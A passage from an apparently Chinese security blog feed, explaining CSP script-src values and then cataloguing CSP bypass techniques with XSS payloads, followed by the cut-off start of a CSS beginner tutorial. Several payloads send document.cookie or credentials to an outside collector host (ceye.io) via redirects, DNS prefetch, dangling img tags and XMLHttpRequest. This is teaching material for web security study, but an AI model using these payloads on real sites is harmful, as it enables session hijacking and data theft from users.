<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 错误的写法</span></span><br><span class="line">script-src https:<span class="comment">//host1.com; script-src https://host2.com</span></span><br><span class="line"><span class="comment"># 正确的写法</span></span><br><span class="line">script-src https:<span class="comment">//host1.com https://host2.com</span></span><br></pre></td></tr></table></figure>
<p>如果不设置某个限制选项，就是默认允许任何值。</p>
<h3 id="script-src-的特殊值"><a href="#script-src-的特殊值" class="headerlink" title="script-src 的特殊值"></a>script-src 的特殊值</h3><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<ul>
<li>**<code>&#39;unsafe-inline&#39;</code>**：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li>
<li><strong>unsafe-eval</strong>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
<li><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行。但是这个随机字符串，应当是唯一，不应该是写死的。如果是固定的nonce值，那么nonce没有任何意义，因为攻击者可以将自己注入的script标签也添加上相同的nonce值。</li>
</ul>
<p>example：服务器发送网页的时候，告诉浏览器一个随机生成的token</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#x27;</span></span><br></pre></td></tr></table></figure>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">EDNnf03nceIOfn39fn3e9h3sdfa</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// some code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
</ul>
<p>example:服务器给出一个允许执行的代码的hash值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&#x27;</span></span><br></pre></td></tr></table></figure>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Hello, world.&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意，计算hash值的时候，<code>&lt;script&gt;</code>标签不算在内。</p>
<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
<h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>当URL允许<code>script-src &#39;unsafe-inline&#39;</code>时，可以执行脚本但是由于CSP无法将数据发送出去，这时候可以利用<code>window.open</code>、<code>location</code>、<code>&lt;a&gt;</code>跳转</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy:default-src &#x27;self&#x27; ;script-src &#x27;unsafe-inline&#x27;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://t6n089.ceye.io/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href = <span class="string">&#x27;http://t6n089.ceye.io/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> a=<span class="built_in">document</span>.createElement(<span class="string">&quot;a&quot;</span>);a.href=<span class="string">&#x27;http://t6n089.ceye.io/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);a.click();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210322214824468.png" alt="image-20210322214824468"></p>
<h3 id="DNS预加载"><a href="#DNS预加载" class="headerlink" title="DNS预加载"></a>DNS预加载</h3><p>一般来说，<code>self</code>代表只接受符合同源策略的URL，这样一来，大部分的XSS和CSRF都会失效。但<code>&lt;link&gt;</code>标签除外。我们可以通过<code>&lt;link&gt;</code>标签绕过CSP。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy:<span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> ;script-src <span class="string">&#x27;unsafe-inline&#x27;</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;body&#x27;</span>).innerHTML=<span class="string">&quot;&lt;link rel=&#x27;dns-prefetch&#x27; href=&#x27;http://&quot;</span>+<span class="built_in">document</span>.cookie.split(<span class="regexp">/;|=/</span>)[<span class="number">0</span>].trim()+<span class="string">&quot;.t6n089.ceye.io&#x27;&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这样，我们可以通过预加载，将数据添加到<code>&lt;link&gt;</code>标签的DNS预解析的子域名中，从DNS记录中拿到数据。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
<h3 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h3><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建<code>&lt;iframe&gt;</code>用JavaScript直接操作A页面的DOM，可以说A页面的CSP防护完全失效。</p>
<p>A页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>B页面:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">&quot;A页面&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210322220648702.png" alt="image-20210322220648702"></p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>一般站点都会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险。</p>
<p>这里给出orange师傅绕hackmd CSP的文章<a class="link"   href="https://paper.seebug.org/855/" >Hackmd XSS<i class="fas fa-external-link-alt"></i></a></p>
<p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323113111535.png" alt="image-20210323113111535"></p>
<h3 id="站点可控静态资源"><a href="#站点可控静态资源" class="headerlink" title="站点可控静态资源"></a>站点可控静态资源</h3><p>给一个绕过codimd的(实例)<a class="link"   href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" >codimd xss<i class="fas fa-external-link-alt"></i></a></p>
<p>当网站允许 <code>unsafe-eva</code>l 且允许<code>google-analytics</code>谷歌分析站点的JS加载时，我们可以利用Google Tag Manager 自定义JS，生成一个自定义JavaScript内容的<code>google-analytics</code>的链接。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323110922893.png" alt="image-20210323110922893"></p>
<h3 id="站点可控JSONP"><a href="#站点可控JSONP" class="headerlink" title="站点可控JSONP"></a>站点可控JSONP</h3><p>大部分站点的jsonp是完全可控的，只不过有些站点会让JSONP不返回HTML类型防止直接的反射型XSS，但是如果将URL插入到<code>&lt;script&gt;</code>标签中，除非设置<code>x-content-type-options</code>头，否者尽管返回类型不一致，浏览器依旧会当成JS进行解析。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src https://www.google.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323112718427.png" alt="image-20210323112718427"></p>
<p>下面是一些存在用户可控资源或者jsonp比较常用站点的github项目：<a class="link"   href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt" >https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Base-uri"><a href="#Base-uri" class="headerlink" title="Base-uri"></a>Base-uri</h3><p>当服务器CSP <code>script-src</code>采用了<code>nonce</code>时，如果只设置了default-src没有额外设置<code>base-uri</code>，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法<code>&lt;script&gt;</code>标签采用了相对路径，那么最终加载的JS就是针对<code>&lt;base&gt;</code>标签中指定URL的相对路径。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.91.140&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323115106369.png" alt="image-20210323115106369"></p>
<h3 id="利用浏览器自动补全"><a href="#利用浏览器自动补全" class="headerlink" title="利用浏览器自动补全"></a>利用浏览器自动补全</h3><ul>
<li>情形一</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    header(&quot;X-XSS-Protection:0&quot;);</span><br><span class="line">    header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-xxxxx&#39;&quot;);</span><br><span class="line"></span><br><span class="line">    echo $_GET[&#39;xss&#39;]；</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script nonce&#x3D;&#39;xxxxx&#39;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>如上这种情况， 注入点在<code>&lt;script&gt;</code> 标签的正上方，可以输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;data:text&#x2F;plain,alert(1)</span><br></pre></td></tr></table></figure>
<p>利用浏览器的自动补全,<code>&lt;script</code> 会变成一个属性，后面的nonce属性也被保留下来，所以绕过了nonce。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323120414445.png" alt="image-20210323120414445"></p>
<p>这里在chrome浏览器失效，但是在火狐浏览器可以。</p>
<ul>
<li>情形二</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    header(&quot;X-XSS-Protection:0&quot;);</span><br><span class="line">    header(&quot;Content-Security-Policy: default-src &#39;self&#39;;script-src &#39;self&#39;; img-src *;&quot;);</span><br><span class="line"></span><br><span class="line">    echo $_GET[&#39;xss&#39;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2 id&#x3D;&quot;id&quot;&gt;3&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure>
<p>如下这种情况，注入点在需要带出的数据上方。我们的目标是拿到注入点下方一个标签的数据。可以看到，前提<code>&lt;img&gt;</code>标签是允许加载跨域的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;t6n089.ceye.io?a&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323145513874.png" alt="image-20210323145513874"></p>
<p>这里仍然是chrome无效，火狐有效</p>
<h3 id="meta网页跳转"><a href="#meta网页跳转" class="headerlink" title="meta网页跳转"></a>meta网页跳转</h3><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;nonce-test&#x27;</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://x.x.x.x/&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="object-src（PDFXSS）"><a href="#object-src（PDFXSS）" class="headerlink" title="object-src（PDFXSS）"></a>object-src（PDFXSS）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br></pre></td></tr></table></figure>
<p>在CSP标准里面，有一个属性是<code>object-src</code>，它限制的是<code>&lt;embed&gt; </code>、<code>&lt;object&gt;</code> 、<code>&lt;applet&gt;</code>标签的src，也就是插件的src，于是我们可以通过插件来执行JavaScript代码，插件的JS代码并不受<code>script-src</code>的约束。PDF文件中允许执行javascript脚本，但是之前浏览器的PDF解析器并不会解析PDF中的JS，但是之前chrome的一次更新中突然允许加载PDF的JavaScript脚本。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.91.140/test.pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323175753026.png" alt="image-20210323175753026"></p>
<p>当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等<br>具体可以看看这篇文章<a class="link"   href="https://blog.csdn.net/microzone/article/details/52850623" >https://blog.csdn.net/microzone/article/details/52850623<i class="fas fa-external-link-alt"></i></a></p>
<p>当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件。</p>
<h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>SVG作为一个矢量图，但是却能够执行JavaScript脚本，如果页面中存在上传功能，并且没有过滤SVG，那么可以通过上传恶意SVG图像来XSS。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">id</span>=<span class="string">&quot;Layer_1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 751 751&quot;</span> <span class="attr">enable-background</span>=<span class="string">&quot;new 0 0 751 751&quot;</span> <span class="attr">xml:space</span>=<span class="string">&quot;preserve&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">&quot;image0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;751&quot;</span> <span class="attr">height</span>=<span class="string">&quot;751&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0&quot;</span> <span class="attr">href</span>=<span class="string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323180947513.png" alt="image-20210323180947513"></p>
<h3 id="302重定向"><a href="#302重定向" class="headerlink" title="302重定向"></a>302重定向</h3><p>参考自<a class="link"   href="https://lorexxar.cn/2016/10/31/csp-then2/" >CSP进阶-302 Bypass CSP<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(&quot;Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;192.168.91.140&#x2F;a&quot;);</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     csp header test </span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">     &lt;&#x2F;script&gt;</span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>这里CSP没有设置<code>default-src</code>，只设置了<code>script-src</code>中仅仅允许了两个域：</p>
<ul>
<li>自己的域</li>
<li><code>http://192.168.91.140/a</code></li>
</ul>
<p>在第一个域下的某个位置有个可以定义重定向的页面，比如<code>http://127.0.0.1/302.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_GET</span>[u]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后我们需要有一个上传文件的域，这里是<code>http://192.168.91.140/b/</code>，我们上传的文件都放在这个文件夹，由于我们设置的<code>script-src</code>并不包含这个域，因此不能使用<code>&lt;script&gt;</code>标签直接引用这个域下的内容，但是<code>script-src</code>包含了<code>http://192.168.91.140/a/</code>这个域，<strong>也就是我们上传目录的根域和他允许的域的根域是一样的</strong>，那么我们就可以利用重定向来绕过CSP。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?input&#x3D;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;CSP&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;192.168.91.140&#x2F;b&#x2F;xss.js&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>b.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var xml &#x3D; new XMLHttpRequest(); </span><br><span class="line">xml.open(&#39;POST&#39;, &#39;http:&#x2F;&#x2F;t6n089.ceye.io&#39;, true); </span><br><span class="line">xml.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;); </span><br><span class="line">xml.send(&#39;username&#x3D;123&amp;password&#x3D;123&#39;);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324114801148.png" alt="image-20210324114801148"></p>
<h3 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h3><p>这个是用来绕过<code>script nonce</code>的一个方法：<a class="link"   href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" >通过浏览器缓存来bypass CSP script nonce<i class="fas fa-external-link-alt"></i></a></p>
<p>这个看了个大概意思，也不知道行不行：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/2313934391.png" alt="img"></p>
<p>​    就是利用修改<code>location.hash</code>览器不会请求服务器，那么nonce string就不会更换的方法。先找到要攻击页面的同源域下的另一个没有CSP保护的页面，在这个页面构造XSS，先开一个<code>&lt;iframe&gt;</code>请求要攻击的页面，获取到nonce值后，再新建一个<code>&lt;iframe&gt;</code>，添加带有nonce字符串的<code>&lt;iframe&gt;</code>窗口请求要攻击的页面，执行任意XSS。其中所有的<code>&lt;iframe&gt;</code>的<code>src</code>属性都只修改<code>#</code>后面的内容来避免刷新<code>nonce</code>。</p>
<h3 id="上传带有JS的文件"><a href="#上传带有JS的文件" class="headerlink" title="上传带有JS的文件"></a>上传带有JS的文件</h3><p>下面的方法其实不算是绕过CSP，实际上是绕过了上传的过滤规则，然后在域内进行调用，其实是遵守了CSP的规则。</p>
<ul>
<li>带有JS的JPEG</li>
</ul>
<p><a class="link"   href="https://lorexxar.cn/2016/12/07/polyglot-JPEGs-bypass-csp/" >using polyglot JPEGs bypass CSP 分析<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li>带有JS的Wave</li>
</ul>
<p><a class="link"   href="https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw" >使用 Wave 文件绕过 CSP 策略<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://xz.aliyun.com/t/5084#toc-13" >我的CSP绕过思路及总结<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.szfszf.top/article/32/" >CSP 概念及绕过分析总结<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS基础</title>
    <url>/2021/02/06/CSS%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="1、什么是CSS"><a href="#1、什么是CSS" class="headerlink" title="1、什么是CSS"></a>1、什么是CSS</h2><p>如何学习</p>
<ol>
<li>CSS是什么</li>
<li>CSS怎么用（快速入门）</li>
<li><strong>CSS选择器（重点+难点）</strong></li>
<li>美化网页（文字，阴影，超链接，列表，渐变…）</li>
<li>盒子模型</li>
<li>浮动</li>
<li>定位</li>
<li>网页动画（特效）</li>
</ol>
<h3 id="1-1-什么是CSS"><a href="#1-1-什么是CSS" class="headerlink" title="1.1 什么是CSS"></a>1.1 什么是CSS</h3><p>Cascading Style Sheet 层叠级联样式表</p>
<p>CSS：表现（美化网页）</p>
<p>字体，颜色，边距，宽度，背景图片，网页定位，网页浮动…</p>
<h3 id="1-2-发展史"><a href="#1-2-发展史" class="headerlink" title="1.2 发展史"></a>1.2 发展史</h3><p>CSS1.0</p>
<p>CSS2.0    DIV(块) + CSS，THML与CSS结构分离的思想，网页变得简单，SEO</p>
<p>CSS2.1    浮动，定位</p>
<p>CSS3.0    圆角，阴影，动画…    浏览器兼容性~</p>
<h3 id="1-3-快速入门"><a href="#1-3-快速入门" class="headerlink" title="1.3 快速入门"></a>1.3 快速入门</h3><p>style</p>
<p><strong>基本入门</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 规范，&lt;style&gt;可以编写CSS代码，每一个声明，最好使用分号结尾</span></span><br><span class="line"><span class="comment">    语法：</span></span><br><span class="line"><span class="comment">        选择器&#123;</span></span><br><span class="line"><span class="comment">            声明1;</span></span><br><span class="line"><span class="comment">            声明2;</span></span><br><span class="line"><span class="comment">            声明3;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        h1&#123;</span><br><span class="line">            color: red;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span 